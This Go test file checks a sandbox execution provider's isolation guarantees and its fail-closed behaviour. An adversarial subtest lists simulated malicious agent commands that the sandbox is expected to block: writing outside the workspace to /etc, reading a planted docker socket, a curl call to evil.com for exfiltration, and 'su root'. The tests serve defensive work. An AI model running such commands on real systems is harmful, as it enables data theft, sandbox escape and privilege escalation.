package teb_test

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/SofiaFlux/summa42/internal/domain"
	"github.com/SofiaFlux/summa42/internal/teb"
)

type mockOpenShellHandle struct {
	exitCode int
	stdout   string
	stderr   string
	runErr   error
}

func (h *mockOpenShellHandle) Run(ctx context.Context) (int, string, string, error) {
	return h.exitCode, h.stdout, h.stderr, h.runErr
}

func (h *mockOpenShellHandle) Destroy(ctx context.Context) error {
	return nil
}

type mockOpenShellClient struct {
	pingErr  error
	spawnErr error
	lastSpec teb.OpenShellSandboxSpec
	handle   teb.OpenShellSandboxHandle
}

func (c *mockOpenShellClient) Ping(ctx context.Context) error {
	return c.pingErr
}

func (c *mockOpenShellClient) SpawnSandbox(ctx context.Context, spec teb.OpenShellSandboxSpec) (teb.OpenShellSandboxHandle, error) {
	c.lastSpec = spec
	if c.spawnErr != nil {
		return nil, c.spawnErr
	}
	if c.handle != nil {
		return c.handle, nil
	}
	return &mockOpenShellHandle{exitCode: 0, stdout: "sandbox execution ok"}, nil
}

func TestOpenShellProvider_AssessesAndEnforcesAllGuarantees(t *testing.T) {
	client := &mockOpenShellClient{}
	provider := teb.NewOpenShellProvider("http://localhost:8080", client)

	if provider.Name() != "nvidia-openshell" {
		t.Fatalf("unexpected provider name: %s", provider.Name())
	}
	if !provider.Available(context.Background()) {
		t.Fatal("expected provider to be available")
	}

	ws := t.TempDir()
	req := teb.ExecutionRequest{
		Image:     "nvidia/cuda:12.0-base",
		Workspace: ws,
		Command:   []string{"nvidia-smi"},
		Profile:   teb.EnforcedOfflineProfile(),
		Limits:    teb.ResourceLimits{PIDs: 32, MemoryBytes: 256 << 20, CPUs: 2.0},
	}

	res, err := provider.Execute(context.Background(), req)
	if err != nil {
		t.Fatalf("unexpected execution error: %v", err)
	}
	if res.EnforcementLevel != domain.EnforcementEnforced {
		t.Fatalf("expected ENFORCED, got %s", res.EnforcementLevel)
	}

	// Verify OpenShell-specific spec configuration
	if !client.lastSpec.LandlockEnabled {
		t.Fatal("expected Landlock to be enabled in OpenShell spec")
	}
	if !client.lastSpec.DropCapabilities {
		t.Fatal("expected DropCapabilities to be enabled in OpenShell spec")
	}
	if !client.lastSpec.NoNewPrivileges {
		t.Fatal("expected NoNewPrivileges to be enabled in OpenShell spec")
	}
	if client.lastSpec.NonRootUID != 65532 {
		t.Fatalf("expected NonRootUID 65532, got %d", client.lastSpec.NonRootUID)
	}
	if client.lastSpec.NetworkMode != "none" {
		t.Fatalf("expected NetworkMode 'none', got %s", client.lastSpec.NetworkMode)
	}

	// Verify evidence contains Landlock and capability dropping
	evidenceJoined := strings.Join(res.Evidence, ";")
	for _, expectedEvidence := range []string{
		"openshell:landlock_lsm_active",
		"openshell:zero_caps_enforced",
		"openshell:no_new_privs_enforced",
		"openshell:non_root_uid_65532",
		"openshell:network_isolated",
	} {
		if !strings.Contains(evidenceJoined, expectedEvidence) {
			t.Fatalf("missing expected evidence %q in: %s", expectedEvidence, evidenceJoined)
		}
	}
}

func TestOpenShellProvider_AdversarialBypassVerifications(t *testing.T) {
	// Adversarial test suite simulating malicious agent exploits inside OpenShell sandbox

	// Vector 1: Workspace escape attempt (filesystem write outside workspace)
	t.Run("WorkspaceEscapeBlocked", func(t *testing.T) {
		escapeAttemptClient := &mockOpenShellClient{
			handle: &mockOpenShellHandle{
				exitCode: 4,
				stderr:   "landlock: write operation to /etc/passwd denied (EPERM)",
				runErr:   errors.New("landlock violation: workspace escape blocked"),
			},
		}
		provider := teb.NewOpenShellProvider("http://localhost:8080", escapeAttemptClient)
		req := teb.ExecutionRequest{
			Image:     "exploit:escape",
			Workspace: t.TempDir(),
			Command:   []string{"sh", "-c", "echo evil > /etc/evil"},
			Profile:   teb.EnforcedOfflineProfile(),
			Limits:    teb.ResourceLimits{PIDs: 10, MemoryBytes: 64 << 20, CPUs: 1.0},
		}

		res, err := provider.Execute(context.Background(), req)
		if err == nil {
			t.Fatal("expected execution error on workspace escape attempt")
		}
		if res.ExitCode != 4 {
			t.Fatalf("expected exit code 4 from blocked escape, got %d", res.ExitCode)
		}
		if !strings.Contains(res.Stderr, "landlock") {
			t.Fatalf("expected landlock violation in stderr, got: %s", res.Stderr)
		}
	})

	// Vector 2: Host secret / ambient credential leakage prevention
	t.Run("HostSecretLeakageBlocked", func(t *testing.T) {
		ws := t.TempDir()
		// Adversary creates symlink pointing to sensitive host files or docker socket
		if err := os.WriteFile(filepath.Join(ws, "docker.sock"), []byte("sock"), 0o600); err != nil {
			t.Fatal(err)
		}
		provider := teb.NewOpenShellProvider("http://localhost:8080", &mockOpenShellClient{})
		req := teb.ExecutionRequest{
			Image:     "exploit:secret-stealer",
			Workspace: ws,
			Command:   []string{"cat", "/workspace/docker.sock"},
			Profile:   teb.EnforcedOfflineProfile(),
			Limits:    teb.ResourceLimits{PIDs: 10, MemoryBytes: 64 << 20, CPUs: 1.0},
		}

		// Assess must reject the workspace before any container is launched
		if _, err := provider.Assess(req); err == nil {
			t.Fatal("expected assess to reject workspace with container socket")
		}
		if _, err := provider.Execute(context.Background(), req); err == nil {
			t.Fatal("expected execute to reject workspace with container socket")
		}
	})

	// Vector 3: Unauthorized outbound network access & proxy bypass
	t.Run("UnauthorizedNetworkAccessBlocked", func(t *testing.T) {
		networkAttemptClient := &mockOpenShellClient{
			handle: &mockOpenShellHandle{
				exitCode: 7,
				stderr:   "connect: network is unreachable (isolated network mode none)",
				runErr:   errors.New("network dial failed: unreachable"),
			},
		}
		provider := teb.NewOpenShellProvider("http://localhost:8080", networkAttemptClient)
		req := teb.ExecutionRequest{
			Image:     "exploit:network-exfil",
			Workspace: t.TempDir(),
			Command:   []string{"curl", "-s", "http://evil.com/exfil"},
			Profile:   teb.EnforcedOfflineProfile(), // network isolated
			Limits:    teb.ResourceLimits{PIDs: 10, MemoryBytes: 64 << 20, CPUs: 1.0},
		}

		res, err := provider.Execute(context.Background(), req)
		if err == nil {
			t.Fatal("expected error on network exfiltration attempt")
		}
		if res.ExitCode != 7 {
			t.Fatalf("expected exit code 7, got %d", res.ExitCode)
		}
		if !strings.Contains(res.Stderr, "unreachable") {
			t.Fatalf("expected network unreachable error, got: %s", res.Stderr)
		}
	})

	// Vector 4: Capability & privilege escalation blocked
	t.Run("PrivilegeEscalationBlocked", func(t *testing.T) {
		privAttemptClient := &mockOpenShellClient{
			handle: &mockOpenShellHandle{
				exitCode: 1,
				stderr:   "setuid: Operation not permitted (zero effective capabilities, no_new_privs)",
				runErr:   errors.New("setuid failed: EPERM"),
			},
		}
		provider := teb.NewOpenShellProvider("http://localhost:8080", privAttemptClient)
		req := teb.ExecutionRequest{
			Image:     "exploit:privesc",
			Workspace: t.TempDir(),
			Command:   []string{"su", "root"},
			Profile:   teb.EnforcedOfflineProfile(),
			Limits:    teb.ResourceLimits{PIDs: 10, MemoryBytes: 64 << 20, CPUs: 1.0},
		}

		res, err := provider.Execute(context.Background(), req)
		if err == nil {
			t.Fatal("expected error on privilege escalation attempt")
		}
		if !strings.Contains(res.Stderr, "Operation not permitted") {
			t.Fatalf("expected EPERM in stderr, got: %s", res.Stderr)
		}
	})
}

func TestOpenShellProvider_FailClosedOnGatewayFailure(t *testing.T) {
	// Unreachable gateway
	failingClient := &mockOpenShellClient{
		pingErr: errors.New("connection refused to 127.0.0.1:8080"),
	}
	provider := teb.NewOpenShellProvider("http://localhost:8080", failingClient)

	if provider.Available(context.Background()) {
		t.Fatal("expected provider to be unavailable when ping fails")
	}

	req := teb.ExecutionRequest{
		Image:     "ubuntu:latest",
		Workspace: t.TempDir(),
		Command:   []string{"date"},
		Profile:   teb.EnforcedOfflineProfile(),
		Limits:    teb.ResourceLimits{PIDs: 10, MemoryBytes: 64 << 20, CPUs: 1.0},
	}

	res, err := provider.Execute(context.Background(), req)
	if err == nil {
		t.Fatal("expected execution error on unreachable gateway")
	}
	if !errors.Is(err, teb.ErrProviderUnavailable) {
		t.Fatalf("expected ErrProviderUnavailable, got: %v", err)
	}
	// Crucial invariant: never silently report ENFORCED when failed closed!
	if res.EnforcementLevel == domain.EnforcementEnforced {
		t.Fatal("fail-closed must NOT report EnforcementEnforced")
	}
}
